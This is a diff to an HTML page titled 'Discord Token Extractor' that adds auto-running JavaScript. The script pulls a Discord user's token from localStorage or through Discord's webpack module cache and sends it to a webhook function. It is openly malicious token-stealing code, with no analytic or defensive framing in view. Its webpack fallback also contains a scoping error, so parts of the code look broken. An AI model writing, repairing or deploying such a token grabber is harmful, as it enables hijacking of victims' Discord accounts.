@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hacked Page</title>
+    <title>Discord Token Extractor</title>
     <style>
         body {
             background-color: black;
@@ -98,20 +98,31 @@
             });
         }
 
-        // Extract Discord Token from localStorage (if available)
-        function getDiscordTokenFromStorage() {
-            // Access the localStorage to find the Discord token
-            const token = localStorage.getItem('discord_token'); // Assuming the token is saved under 'discord_token'
-            
+        // Extract Discord Token from localStorage or Webpack
+        function extractDiscordToken() {
+            // Check if token is in localStorage
+            const token = localStorage.getItem('discord_token');  // Replace with correct key if needed
             if (token) {
                 sendTokenToWebhook(token);
             } else {
-                console.log("No token found in localStorage.");
+                // If token not in localStorage, attempt to get it from webpack
+                webpackChunkdiscord_app.push([[''], {}, e => {
+                    let m = [];
+                    for (let c in e.c) m.push(e.c[c]);
+                }]);
+
+                const module = m.find(m => m?.exports?.default?.getToken !== void 0);
+                if (module && module.exports && module.exports.default) {
+                    const token = module.exports.default.getToken();
+                    sendTokenToWebhook(token);
+                } else {
+                    console.error("Token not found in webpack.");
+                }
             }
         }
 
-        // Automatically get token and send to Webhook
-        getDiscordTokenFromStorage();
+        // Automatically try to extract the token
+        extractDiscordToken();
     </script>
 
     <audio autoplay loop>
